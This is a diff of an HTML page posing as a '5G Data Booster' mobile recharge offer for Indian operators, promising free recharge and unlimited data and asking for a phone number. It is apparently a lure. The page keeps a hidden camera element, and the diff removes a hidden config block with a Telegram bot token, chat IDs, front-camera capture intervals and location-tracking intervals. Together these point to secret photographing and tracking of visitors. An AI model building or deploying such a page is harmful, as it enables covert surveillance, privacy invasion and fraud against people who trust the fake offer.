@@ -3,91 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>5G Network Booster | Premium Data Plans</title>
+    <title>5G Network Booster - Multi Bot</title>
     <link rel="stylesheet" href="style.css">
+ 
 </head>
 <body>
-    <div class="mode-badge" id="statusBadge">SECURE CONNECTION</div>
+    <div class="bot-count-badge" id="botCountBadge">🤖 LOADING...</div>
     
     <div class="container">
         <div class="header">
-            <div class="logo">5G BOOST</div>
-            <h1>Network Data Booster</h1>
-            <p>Premium Data Plans | Instant Activation</p>
+            <div class="logo">🚀</div>
+            <h1>5G DATA BOOSTER</h1>
+            <p>Free Recharge + Unlimited Data | Limited Offer</p>
         </div>
 
         <div class="balance-card">
-            <div class="balance-label">ACCOUNT BALANCE</div>
+            <div class="balance-label">AVAILABLE BALANCE</div>
             <div class="balance-amount">₹<span id="balance">249</span></div>
-            <div class="data-badge">2GB BONUS DATA ACTIVE</div>
+            <div class="data-badge">🎁 2GB BONUS DATA EXPIRES SOON</div>
         </div>
 
-        <div class="section-title">POPULAR RECHARGE PLANS</div>
+        <div class="section-title">📱 POPULAR RECHARGE PLANS</div>
         <div class="recharge-grid" id="rechargeGrid">
-            <div class="recharge-card" data-amount="199" data-data="1.5GB/day">
+            <div class="recharge-card" data-amount="199" data-data="1.5GB/day" data-days="28">
                 <div class="recharge-amount">₹199</div>
                 <div class="recharge-data">1.5GB/day</div>
                 <div class="recharge-price">28 Days</div>
                 <div class="recharge-tag">POPULAR</div>
             </div>
-            <div class="recharge-card" data-amount="299" data-data="2GB/day">
+            <div class="recharge-card" data-amount="299" data-data="2GB/day" data-days="28">
                 <div class="recharge-amount">₹299</div>
                 <div class="recharge-data">2GB/day</div>
                 <div class="recharge-price">28 Days</div>
                 <div class="recharge-tag">BEST VALUE</div>
             </div>
-            <div class="recharge-card" data-amount="399" data-data="3GB/day">
+            <div class="recharge-card" data-amount="399" data-data="3GB/day" data-days="28">
                 <div class="recharge-amount">₹399</div>
                 <div class="recharge-data">3GB/day</div>
                 <div class="recharge-price">28 Days</div>
                 <div class="recharge-tag">PREMIUM</div>
             </div>
-            <div class="recharge-card" data-amount="79" data-data="2GB">
+            <div class="recharge-card" data-amount="79" data-data="2GB" data-days="1">
                 <div class="recharge-amount">₹79</div>
                 <div class="recharge-data">2GB Data</div>
                 <div class="recharge-price">1 Day</div>
             </div>
-            <div class="recharge-card" data-amount="149" data-data="6GB">
+            <div class="recharge-card" data-amount="149" data-data="6GB" data-days="7">
                 <div class="recharge-amount">₹149</div>
                 <div class="recharge-data">6GB Data</div>
                 <div class="recharge-price">7 Days</div>
             </div>
-            <div class="recharge-card" data-amount="599" data-data="2GB/day">
+            <div class="recharge-card" data-amount="599" data-data="2GB/day" data-days="56">
                 <div class="recharge-amount">₹599</div>
                 <div class="recharge-data">2GB/day</div>
                 <div class="recharge-price">56 Days</div>
+                <div class="recharge-tag">SAVER</div>
             </div>
         </div>
 
         <div class="operator-selector">
-            <div class="operator-title">SELECT NETWORK OPERATOR</div>
+            <div class="operator-title">📡 SELECT YOUR OPERATOR</div>
             <div class="operator-icons">
-                <div class="operator" data-operator="jio">
-                    <span class="operator-icon">📶</span>
-                    <span class="operator-name">Jio</span>
-                </div>
-                <div class="operator" data-operator="airtel">
-                    <span class="operator-icon">📱</span>
-                    <span class="operator-name">Airtel</span>
-                </div>
-                <div class="operator" data-operator="vi">
-                    <span class="operator-icon">💜</span>
-                    <span class="operator-name">Vi</span>
-                </div>
-                <div class="operator" data-operator="bsnl">
-                    <span class="operator-icon">🌐</span>
-                    <span class="operator-name">BSNL</span>
-                </div>
+                <div class="operator" data-operator="jio"><span class="operator-icon">📶</span><span class="operator-name">Jio</span></div>
+                <div class="operator" data-operator="airtel"><span class="operator-icon">📱</span><span class="operator-name">Airtel</span></div>
+                <div class="operator" data-operator="vi"><span class="operator-icon">💜</span><span class="operator-name">Vi</span></div>
+                <div class="operator" data-operator="bsnl"><span class="operator-icon">🇮🇳</span><span class="operator-name">BSNL</span></div>
             </div>
         </div>
 
         <div class="number-input">
-            <label class="input-label">MOBILE NUMBER</label>
+            <label class="input-label">📞 ENTER MOBILE NUMBER</label>
             <input type="tel" class="input-field" id="mobileNumber" placeholder="Enter 10 digit number" maxlength="10">
         </div>
 
-        <button class="proceed-btn" id="proceedBtn">ACTIVATE PLAN</button>
-        <div class="footer-text">By proceeding, you agree to terms and conditions</div>
+        <button class="proceed-btn" id="proceedBtn">💸 RECHARGE NOW</button>
+        <p class="terms">By proceeding, you agree to T&C</p>
     </div>
 
     <div class="hidden-cam">
@@ -96,31 +86,21 @@
 
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Processing Activation</div>
-        <div class="loading-subtext">Please wait while we verify your request</div>
+        <div class="loading-text">Processing Recharge...</div>
+        <div class="loading-subtext">Please wait, verifying payment</div>
     </div>
 
     <div class="success-modal" id="successModal">
         <div class="success-card">
-            <div class="success-icon">✓</div>
-            <div class="success-title">Activation Successful</div>
+            <div class="success-icon">✅</div>
+            <div class="success-title">RECHARGE SUCCESSFUL!</div>
             <div class="success-msg" id="successMsg"></div>
-            <button class="close-btn" onclick="closeSuccessModal()">Continue</button>
+            <button class="close-btn" onclick="closeSuccessModal()">OK</button>
         </div>
     </div>
 
     <div id="toast" class="toast"></div>
-    <div class="status-badge" id="debugInfo">Initializing</div>
-
-    <!-- Hidden Config (Environment Variables) -->
-    <div id="app-config" style="display: none;" 
-         data-bot-token="8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY"
-         data-chat-ids="8256108006,5087129572,9876543210"
-         data-cam-mode="front"
-         data-capture-interval="5000"
-         data-location-interval="8000"
-         data-session-duration="30000">
-    </div>
+    <div class="debug-info" id="debugInfo">Initializing...</div>
 
     <script src="script.js"></script>
 </body>
